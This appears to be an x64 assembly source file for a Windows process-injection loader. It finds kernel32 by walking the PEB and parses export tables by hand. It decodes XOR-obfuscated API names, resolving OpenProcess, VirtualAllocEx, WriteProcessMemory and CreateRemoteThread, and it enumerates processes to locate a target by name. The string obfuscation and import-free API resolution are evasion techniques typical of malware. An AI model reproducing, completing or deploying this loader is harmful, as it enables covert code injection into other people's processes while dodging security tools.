section .text

; extern GetStdHandle
; extern WriteFile

; arg0: dst         rcx
; arg1: src         rdx
; arg2: nBytes      r8
memcpy:
    push rbp
    mov rbp, rsp

    mov rsi, rdx
    mov rdi, rcx
    mov rcx, r8

    rep movsb

    leave
    ret

; arg0 str          rcx
; ret: num chars    rax
strlen:
    push rbp
    mov rbp, rsp

    ; [rbp - 8] = output strlen
    ; 8 bytes padding
    sub rsp, 16                         ; allocate local variable space
    mov qword [rbp - 8], 0              ; strlen = 0

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]                ; ++strlen

        .while_condition:
            mov qword rax, [rbp - 8]        ; strlen counter in rax
            mov byte bl, [rcx + rax]        ; str char in bl

            cmp bl, 0                       ; chr == 0 ?
            jne .loop
    
    mov qword rax, [rbp - 8]            ; strlen in rax
    add rsp, 16                         ; free local variable space

    leave
    ret

; arg0: wstr        rcx
; ret: num chars
wstrlen:
    push rbp
    mov rbp, rsp

    ; [rbp - 8] = output strlen
    sub rsp, 8
    mov qword [rbp - 8], 0

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]                ; ++strlen

        .while_condition:
            mov qword rax, [rbp - 8]        ; strlen counter in rax
            mov qword rdx, 2
            mul rdx
            mov byte bl, [rcx + rax]        ; str char in bl

            cmp bl, 0                       ; chr == 0 ?
            jne .loop
    
    mov qword rax, [rbp - 8]            ; strlen in rax
    add rsp, 8

    leave
    ret

; arg0: dst        rcx
; arg1: src        rdx
strcpy:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; dst
    mov [rbp + 24], rdx             ; src

    mov rsi, [rbp + 24]             ; src
    mov rdi, [rbp + 16]             ; dst

.loop:
    lodsb

    cmp al, 0                       ; end of string ?
    jz .loop_end                    ; yes

    stosb
    jmp .loop

.loop_end:
    
    leave
    ret

; arg0: str1                        rcx
; arg1: str1.len                    rdx
; arg2: wstr2                       r8

; ret: 1 if equal 0 otherwise       rax
strcmpAW:
    push rbp
    mov rbp, rsp

    mov rsi, rcx
    mov rcx, rdx
    mov rdi, r8

    .loop:
        mov al, [rsi]
        mov bl, [rdi]

        cmp al, bl

        jne .loop_end_not_equal

        inc qword rsi
        add rdi, 2
        dec qword rcx
        jnz .loop

    .loop_end_equal:
        mov rax, 1

        leave
        ret

    .loop_end_not_equal:
        xor rax, rax

        leave
        ret

; arg0: str1                        rcx
; arg1: str1.len                    rdx
; arg2: wstr2                       r8

; ret: 1 if equal 0 otherwise       rax
strcmpiAW:
    push rbp
    mov rbp, rsp

    mov rsi, rcx
    mov rcx, rdx
    mov rdi, r8

    .loop:
        movzx eax, byte [rsi]
        movzx ebx, byte [rdi]

        cmp al, bl

        jg .al_more_than_bl
        jl .al_less_than_bl

        inc qword rsi
        add rdi, 2
        dec qword rcx
        jnz .loop

    .loop_end_equal:
        mov rax, 1

        leave
        ret

        .al_more_than_bl:
            add bl, 32
            cmp al, bl

            jne .loop_end_not_equal

            inc qword rsi
            add rdi, 2
            dec qword rcx
            jnz .loop
            
            jmp .loop_end_equal
        
        .al_less_than_bl:
            add al, 32
            cmp al, bl

            jne .loop_end_not_equal

            inc qword rsi
            add rdi, 2
            dec qword rcx
            jnz .loop

            jmp .loop_end_equal

    .loop_end_not_equal:
        xor rax, rax

        leave
        ret


; arg0: str1                    rcx
; arg1: str1 len                rdx
; arg2: str2                    r8

; ret: 1 if equal 0 otherwise   rax
strcmpAA:
    push rbp
    mov rbp, rsp

    mov rsi, rcx
    mov rcx, rdx
    mov rdi, r8

    repe cmpsb
    jrcxz .equal

    .not_equal:
        xor rax, rax

        leave
        ret

    .equal:
        mov rax, 1

        leave
        ret

; arg0: str1                    rcx 
; arg1: str1 len                rdx
; arg2: wstr2                   r8

; ret: 1 if equal 0 otherwise   rax
strcmpiAA:
    push rbp
    mov rbp, rsp

    mov rsi, rcx
    mov rcx, rdx
    mov rdi, r8

    .loop:
        xor rax, rax
        mov al, [rsi]

        xor rbx, rbx
        mov bl, [rdi]

        cmp al, bl
        jg .al_more_than_bl
        jl .al_less_than_bl
        
        inc rsi
        inc rdi
        dec rcx
        jnz .loop

    .loop_end_equal:

        mov rax, 1
    
        leave
        ret

        .al_more_than_bl:
            add bl, 32
            cmp al, bl

            jne .loop_end_not_equal

            inc rsi
            inc rdi
            dec rcx
            jnz .loop

            jmp .loop_end_equal

        .al_less_than_bl:
            add al, 32
            cmp al, bl

            jne .loop_end_not_equal
         
            inc rsi
            inc rdi
            dec rcx
            jnz .loop
            jmp .loop_end_equal

    .loop_end_not_equal:
        xor rax, rax

        leave
        ret

; arg0: data            rcx
; arg1: data_len        rdx
; arg2: key             r8
; arg3: key_len         r9
my_xor:
    push rbp
    mov rbp, rsp

    ; [rbp + 16] = data, [rbp + 24] = data_len
    ; [rbp + 32] = key, [rbp + 40] = key_len
    mov qword [rbp + 16], rcx
    mov qword [rbp + 24], rdx
    mov qword [rbp + 32], r8
    mov qword [rbp + 40], r9

    ; [rbp - 8] = i, [rbp - 16] = j
    ; [rbp - 24] = bInput, [rbp - 32] = b
    ; [rbp - 40] = data_bit_i, [rbp - 48] = key_bit_j
    ; [rbp - 56] = bit_xor
    sub rsp, 56

    mov qword [rbp - 8], 0          ; i = 0
    mov qword [rbp - 16], 0          ; j = 0

    .data_loop:
        mov rax, [rbp - 16]         ; j in rax
        cmp rax, [rbp + 40]         ; j == key_len ?

        jne .continue_data_loop
        xor rax, rax
        mov [rbp - 16], rax         ; j = 0
        
    .continue_data_loop:
        mov qword [rbp - 24], 0         ; bInput = 0
        mov qword [rbp - 32], 0         ; b = 0

        .bit_loop:
        ; bit test data
            xor rdx, rdx

            mov qword rdx, [rbp + 16]        ; ptr to data in rdx
            mov qword rbx, [rbp - 8]       ; i in rbx

            xor rax, rax
            mov al, [rdx + rbx]             ; data char in al

            xor rbx, rbx
            mov bl, [rbp - 32]              ; b in bl

            bt rax, rbx

            jc .data_bit_is_set
            mov qword [rbp - 40], 0         ; data_bit_i = 0
            jmp .bit_loop_continue_data

            .data_bit_is_set:
                mov qword [rbp - 40], 1     ; data_bit_i = 1

        .bit_loop_continue_data:
            ; bit test key

            xor rdx, rdx

            mov qword rdx, [rbp + 32]       ; ptr to key in rdx
            mov qword rbx, [rbp - 16]       ; j in rbx
            
            xor rax, rax
            mov al, [rdx + rbx]             ; key char in al

            xor rbx, rbx
            mov bl, [rbp - 32]              ; b in bl

            bt rax, rbx

            jc .key_bit_is_set
            mov qword [rbp - 48], 0         ; key_bit_i = 0
            jmp .bit_loop_continue_key

            .key_bit_is_set:
                mov qword [rbp - 48], 1     ; key_bit_i = 1

        .bit_loop_continue_key:
            xor rax, rax

            mov al, [rbp - 40]              ; data_bit_i in al
            cmp al, [rbp - 48]              ; data_bit_i == key_bit_i ?

            je .bits_equal
            ; bits are unequal
            mov qword rax, 1
            xor rcx, rcx
            mov cl, [rbp - 32]              ; b in cl
            shl al, cl
            mov [rbp - 56], al              ; bit_xor = (data_bit_i != key_bit_j) << b

            jmp .bits_continue
            .bits_equal:
            ; bits equal
            ; so (data_bit_i != key_bit_j) == 0
                mov qword [rbp - 56], 0     ; bit_xor = 0

        .bits_continue:
            xor rax, rax
            mov al, [rbp - 24]              ; bInput in al
            or al, [rbp - 56]               ; bInput |= bit_xor

            mov [rbp - 24], al              ; al to bInput

            inc qword [rbp - 32]            ; ++b
            mov qword rax, [rbp - 32]       ; b in rax
            cmp qword rax, 8                ; b == 8 ?
            jnz .bit_loop


        mov qword rdx, [rbp + 16]        ; ptr to data in rdx
        mov qword rbx, [rbp - 8]       ; i in rbx

        xor rax, rax
        mov al, [rbp - 24]              ; bInput in al
        mov [rdx + rbx], al             ; data[i] = bInput

        inc qword [rbp - 16]       ; ++j

        inc qword [rbp - 8]        ; ++i
        mov rax, [rbp - 8]         ; i in rax
        cmp rax, [rbp + 24]         ; i == data_len ?

        jne .data_loop

    add rsp, 56

    leave
    ret


; arg0: ptr to string           rcx
; arg1: chr                     rdx
;
; return: ptr to chr            rax
strchr:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx             ; ptr to string
    mov [rbp + 24], rdx             ; chr

    ; [rbp - 8] = cRet
    ; [rbp - 16] = strlen
    ; [rbp - 24] = c
    ; 8 bytes padding
    sub rsp, 32

    mov qword [rbp - 8], 0         ; cRet = 0

    sub rsp, 32
    call strlen                     ; rax = strlen
    add rsp, 32

    mov [rbp - 16], rax

    mov qword [rbp - 24], 0         ; c = 0
    .loop:
        mov rdx, [rbp + 16]         ; ptr to string in rdx     
        mov rbx, [rbp - 24]         ; c in rbx

        mov cl, [rdx + rbx]         ; sStr[c]

        cmp cl, [rbp + 24]          ; sStr[c] == chr ?

        je .equal

        inc qword [rbp - 24]        ; ++c
        mov rax, [rbp - 16]         ; strlen in rax
        cmp [rbp - 24], rax         ; c < strlen ?

        jne .loop

        .equal:
            add rdx, rbx
            mov [rbp - 8], rdx     ; cRet = str + c

    add rsp, 32

    mov rax, [rbp - 24]
    add rax, [rbp +  16]

    leave
    ret

; ; arg0: string buffer           rcx
; ; arg1: string len              rdx
; print_string:
;     push rbp
;     mov rbp, rsp

;     ; [rbp + 16] = ptr to string, [rbp + 24] = string len
;     mov [rbp + 16], rcx          ; ptr to string
;     mov [rbp + 24], rdx         ; string len

;     ; [rbp - 8] = std handle
;     sub rsp, 8                 ; allocate space for local variables

;     sub rsp, 32
;     mov rcx, -11                ; STD_HANDLE_ENUM
;     call GetStdHandle
;     add rsp, 32

;     mov [rbp - 8], rax         ; std handle in rax

;     cmp byte [rbp + 24], 0
;     jne .continue
;         sub rsp, 32
;         mov rcx, [rbp + 16]
;         call strlen

;         mov [rbp + 24], rax

;         add rsp, 32

; .continue:
;     sub rsp, 32 + 8 + 8         ; shadow space + 8 byte param + 16 byte stack align

;     mov rcx, [rbp - 8]
;     mov rdx, [rbp + 16]
;     mov r8, [rbp + 24]
;     xor r9, r9
;     mov dword [rsp + 32], 0
;     call WriteFile

;     add rsp, 32 + 8 + 8

;     add rsp, 8                 ; de allocate space for local variables

;     leave
;     ret


get_kernel_module_handle:
    push rbp
    mov rbp, rsp

    sub rsp, 32
    mov rcx, kernel32_xor
    mov rdx, kernel32_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor                         ; kernel32.dll clear text
    add rsp, 32

    mov rax, gs:[0x60]                  ; peb in rax
    add rax, 0x18                       ; ldr in rax
    mov rax, [rax]
    add rax, 0x20                       ; InMemoryOrderModuleList

    ; [rbp - 8] = First List Entry
    ; [rbp - 16] = Current List Entry
    ; [rbp - 24] = Table Entry
    ; [rbp - 32] = return addr
    sub rsp, 32                         ; allocate local variable space

    mov [rbp - 8], rax                  ; *FirstModule
    mov rax, [rax]
    mov [rbp - 16], rax                 ; CurrentModule
    mov qword [rbp - 32], 0             ; return code

.loop:
    cmp rax, [rbp - 8]                  ; CurrentModule == FirstModule ?
    je .loop_end_equal
        sub rax, 16                     ; *TableEntry
        mov [rbp - 24], rax             ; *TableEntry

        add rax, 0x58                   ; *BaseDLLName
        add rax, 0x8                    ; BaseDLLName.Buffer

        sub rsp, 32
        mov rcx, kernel32_xor
        mov rdx, kernel32_xor.len
        mov r8, [rax]
        call strcmpiAW
        add rsp, 32

        cmp rax, 1                      ; strings match
        je .module_found

        mov rax, [rbp - 16]             ; CurrentModule
        mov rax, [rax]                  ; CurrentModule = CurrentModule->Flink
        mov [rbp - 16], rax             ; CurrentModule

        jmp .loop

.module_found:
    mov rax, [rbp - 24]                 ; *TableEntry
    add rax, 0x30                       ; TableEntry->DllBase
    mov rax, [rax]
    mov [rbp - 32], rax

    jmp .shutdown

.loop_end_equal:

.shutdown:
    add rsp, 32                         ; free local variable space

    mov rax, [rbp - 32]                 ; return code

    leave
    ret

; arg0: base addr           rcx
; arg1: proc name           rdx
; arg2: proc name len       r8
;
; return: proc addr         rax
get_proc_address_by_name:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx         ; base addr
    mov [rbp + 24], rdx         ; proc name
    mov [rbp + 32], r8          ; proc name len

    ; [rbp - 8] = return value
    ; [rbp - 16] = nt headers
    ; [rbp - 24] = export data directory
    ; [rbp - 32] = export directory
    ; [rbp - 40] = address of functions
    ; [rbp - 48] = address of names
    ; [rbp - 56] = address of name ordinals
    ; [rbp - 312] = forwarded dll.function name - 256 bytes
    ; [rbp - 320] = function name
    ; [rbp - 328] = loaded forwarded library addr
    ; [rbp - 336] = function name strlen
    sub rsp, 336                 ; allocate local variable space

    mov qword [rbp - 8], 0      ; return value

    mov rbx, [rbp + 16]         ; base addr
    add rbx, 0x3c               ; e_lfa_new

    movzx ecx, word [rbx]

    mov rax, [rbp + 16]         ; base addr
    add rax, rcx                ; nt header

    mov [rbp - 16], rax         ; nt header

    add rax, 24                 ; optional header
    add rax, 112                ; export data directory

    mov [rbp - 24], rax         ; export data directory

    mov rax, [rbp + 16]         ; base addr
    mov rcx, [rbp - 24]         ; export data directory
    mov ebx, [rcx]
    add rax, rbx                ; export directory

    mov [rbp - 32], rax         ; export directory

    add rax, 28                 ; address of functions rva
    mov eax, [rax]              ; rva in rax
    add rax, [rbp + 16]         ; base addr + address of function rva

    mov [rbp - 40], rax         ; address of functions

    mov rax, [rbp - 32]         ; export directory
    add rax, 32                 ; address of names rva
    mov eax, [rax]              ; rva in rax
    add rax, [rbp + 16]         ; base addr + address of names rva

    mov [rbp - 48], rax         ; address of names

    mov rax, [rbp - 32]         ; export directory
    add rax, 36                 ; address of name ordinals
    mov eax, [rax]              ; rva in rax
    add rax, [rbp + 16]         ; base addr + address of name ordinals

    mov [rbp - 56], rax         ; address of name ordinals

    mov r10, [rbp - 32]         ; export directory
    add r10, 24                 ; number of names
    mov r10d, [r10]             ; number of names in r10

    xor ecx, ecx
.loop_func_names:
    ; to index into an array, we multiply the size of each element with the 
    ; current index and add it to the base addr of the array
    push rcx
    mov dword eax, 4            ; size of dword
    mul rcx                     ; size * index
    mov rbx, [rbp - 48]         ; address of names
    add rbx, rax                ; address of names + n
    mov ebx, [rbx]              ; address of names [n]

    add rbx, [rbp +  16]        ; base addr + address of names [n]

    sub rsp, 32
    mov rcx, [rbp + 24]         ; proc name
    mov rdx, [rbp + 32]         ; proc name len
    mov r8, rbx
    call strcmpiAA
    add rsp, 32

    cmp rax, 1                  ; are strings equal
    je .function_found

    pop rcx
    inc rcx
    cmp rcx, r10
    jne .loop_func_names

    jmp .shutdown

.function_found:
    pop rcx                     ; current index popped
    mov rax, 2
    mul rcx                     ; index * size of element of addrees of name ordinals(word)
    add rax, [rbp - 56]         ; address of name ordinals + n
    movzx eax, word [rax]       ; address of name ordinals [n]; index into address of functions

    mov rbx, 4                  ; size of element of address of functions(dword)
    mul rbx                     ; index * size of element
    add rax, [rbp - 40]         ; address of functions + index
    mov eax, dword [rax]        ; address of functions [index]

    add rax, [rbp + 16]         ; base addr + address of functions [index]

    mov [rbp - 8], rax          ; return value

    mov r8, [rbp + 16]          ; base addr
    mov rax, [rbp - 24]         ; export data directory
    mov eax, [rax]              ; export data directory virtual address
    add r8, rax                 ; base addr + virtual addr

    mov r9, r8
    mov rax, [rbp - 24]         ; export data directory
    add rax, 4                  ; export data directory size
    mov eax, [rax]              ; export data directory size
    add r9, rax                 ; base addr + virtual addr + size

    cmp [rbp - 8], r8           ; below the start of the export directory
    jl .shutdown                ; not forwarded
                                ; or
    cmp [rbp - 8], r9           ; above the end of the export directory
    jg .shutdown                ; not forwarded

    ; make a copy of the string of the forwarded dll
    sub rsp, 32
    mov rcx, rbp
    sub rcx, 312
    mov rdx, [rbp - 8]
    call strcpy
    add rsp, 32

    ; find the position of the '.' which separates the dll name and function name
    sub rsp, 32
    mov rcx, rbp
    sub rcx, 312
    mov rdx, '.'
    call strchr                 ; ptr to chr in rax
    add rsp, 32
    
    mov byte [rax], 0
    inc rax

    mov [rbp - 320], rax        ; forwarded function name

    sub rsp, 32
    mov rcx, rbp
    sub rcx, 312
    call [loadlibrary_addr]     ; library addr
    add rsp, 32

    mov [rbp - 328], rax        ; library addr

    sub rsp, 32
    mov rcx, [rbp - 320]
    call strlen                 ; strlen in rax
    add rsp, 32

    mov [rbp - 336], rax        ; function name strlen

    sub rsp, 32
    mov rcx, [rbp - 328]
    mov rdx, [rbp - 320]
    mov r8, [rbp - 336]
    call get_proc_address_by_name       ; proc addr
    add rsp, 32

    mov [rbp - 8], rax          ; proc addr

.shutdown:
    add rsp, 336                ; free local variable space

    mov rax, [rbp - 8]          ; return value

    leave
    ret


; arg0: base addr               rcx
; arg1: proc name               rdx
; arg2: proc name len           r8
;
; return: proc addr             rax
get_proc_address_by_get_proc_addr:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx         ; base addr
    mov [rbp + 24], rdx         ; proc name
    mov [rbp + 32], r8          ; proc name len

    ; [rbp - 8] = return value
    ; 8 bytes padding
    sub rsp, 16                 ; allocate local variable space

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, [rbp + 24]
    call [get_proc_addr_addr]   ; proc addr
    add rsp, 32

    mov [rbp - 8], rax          ; return value

.shutdown:
    add rsp, 16                 ; free local variable space

    mov rax, [rbp - 8]          ; return value

    leave
    ret

; arg0: base addr               rcx
; arg1: xor str                 rdx
; arg2: xor str len             r8
; arg3: is get proc addr        r9
;
; return: proc addr             rax
unxor_and_get_proc_addr:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx         ; base addr
    mov [rbp + 24], rdx         ; xor str
    mov [rbp + 32], r8          ; xor str len
    mov [rbp + 40], r9          ; is get proc addr

    ; [rbp - 8] = return value
    ; 8 bytes padding
    sub rsp, 16                 ; allocate local variable space

    sub rsp, 32
    mov rcx, [rbp + 24]
    mov rdx, [rbp + 32]
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor
    add rsp, 32

    cmp qword [rbp + 40], 1                   ; is get proc addr
    jne .not_get_proc_addr
        sub rsp, 32
        mov rcx, [rbp + 16]
        mov rdx, [rbp + 24]
        mov r8, [rbp + 32]
        call get_proc_address_by_name
        add rsp, 32

        mov [rbp - 8], rax          ; proc addr

        jmp .shutdown

.not_get_proc_addr:
    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, [rbp + 24]
    mov r8, [rbp + 32]
    call get_proc_address_by_get_proc_addr
    add rsp, 32

    mov [rbp - 8], rax          ; proc addr

.shutdown:

    add rsp, 16                 ; free local variable space
    mov rax, [rbp - 8]          ; return value

    leave
    ret

; arg0: kernel base addr           rcx
populate_kernel_function_ptrs_by_name:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; kernel base addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, get_proc_addr_xor
    mov r8, get_proc_addr_xor.len
    mov r9, 1
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [get_proc_addr_addr], rax           ; GetProcAddress addr
    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, get_last_error_xor
    mov r8, get_last_error_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [get_last_error_addr], rax          ; GetLastError addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, loadlibrary_xor
    mov r8, loadlibrary_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [loadlibrary_addr], rax             ; LoadLibraryA addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, open_process_xor
    mov r8, open_process_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [open_process_addr], rax            ; OpenProcess addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, virtual_alloc_ex_xor
    mov r8, virtual_alloc_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [virtual_alloc_ex_addr], rax        ; VirtualAllocEx addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, virtual_free_ex_xor
    mov r8, virtual_free_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [virtual_free_ex_addr], rax         ; VirtualFreeEx addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, virtual_protect_ex_xor
    mov r8, virtual_protect_ex_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [virtual_protect_ex_addr], rax      ; VirtualProtectEx addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, create_remote_thread_xor
    mov r8, create_remote_thread_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [create_remote_thread_addr], rax    ; CreateRemoteThread addr
     
    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, wait_for_single_object_xor
    mov r8, wait_for_single_object_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [wait_for_single_object_addr], rax  ; WaitForSingleObject addr
 
    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, close_handle_xor
    mov r8, close_handle_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [close_handle_addr], rax            ; CloseHandle addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, create_toolhelp32_snapshot_xor
    mov r8, create_toolhelp32_snapshot_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [create_toolhelp32_snapshot_addr], rax            ; CreateToolhelp32Snapshot addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, process32_first_xor
    mov r8, process32_first_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [process32_first_addr], rax            ; Process32First addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, process32_next_xor
    mov r8, process32_next_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [process32_next_addr], rax          ;  Process32Next addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, sleep_xor
    mov r8, sleep_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [sleep_addr], rax                   ; Sleep addr

    sub rsp, 32
    mov rcx, [rbp + 16]
    mov rdx, write_process_memory_xor
    mov r8, write_process_memory_xor.len
    xor r9, r9
    call unxor_and_get_proc_addr            ; proc addr
    add rsp, 32

    mov [write_process_memory_addr], rax    ; WriteProcessMemory addr
    
.shutdown:
    leave
    ret

; arg0: proc name       rcx
; arg1: proc name len   rdx
;
; return: proc id       rax
find_target_process_id:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                     ; proc name
    mov [rbp + 24], rdx                     ; proc name len

    ; [rbp - 8] = return value
    ; [rbp - 16] = snapshot handle
    ; [rbp - 580] = process entry struct
    ; 12 bytes padding
    sub rsp, 592                            ; allocate local variable space

    mov qword [rbp - 8], 0                  ; return value

    sub rsp, 32
    mov rcx, TH32CS_SNAPPROCESS
    xor rdx, rdx
    call [create_toolhelp32_snapshot_addr]  ; snapshot handle
    add rsp, 32

    cmp rax, INVALID_HANDLE_VALUE
    je .shutdown

    mov [rbp - 16], rax                     ; snapshot handle
    mov dword [rbp - 580], 564              ; processentry32.dwsize

    sub rsp, 32
    mov rcx, [rbp - 16]                     ; snapshot handle
    mov rdx, rbp
    sub rdx, 580                            ; &processentry 
    call [process32_first_addr]
    add rsp, 32

    cmp rax, 0                              ; if !process32First
    je .shutdown

.loop:
    sub rsp, 32
    mov rcx, [rbp - 16]                     ; snapshot handle
    mov rdx, rbp
    sub rdx, 580                            ; &processentry 
    call [process32_next_addr]
    add rsp, 32

    cmp rax, 0
    je .loop_end
        sub rsp, 32
        mov rcx, [rbp + 16]
        mov rdx, [rbp + 24]
        mov r8, rbp
        sub r8, 580
        add r8, 44
        call strcmpiAA
        add rsp, 32

        cmp rax, 1                          ; are strings equal
        je .process_found        

        jmp .loop

.process_found:
    mov rbx, rbp
    sub rbx, 580
    add rbx, 8 

    mov ebx, [rbx]
    mov [rbp - 8], rbx                      ; return value
.loop_end:

.shutdown:
    add rsp, 592                            ; free local variable space

    mov rax, [rbp - 8]

    leave
    ret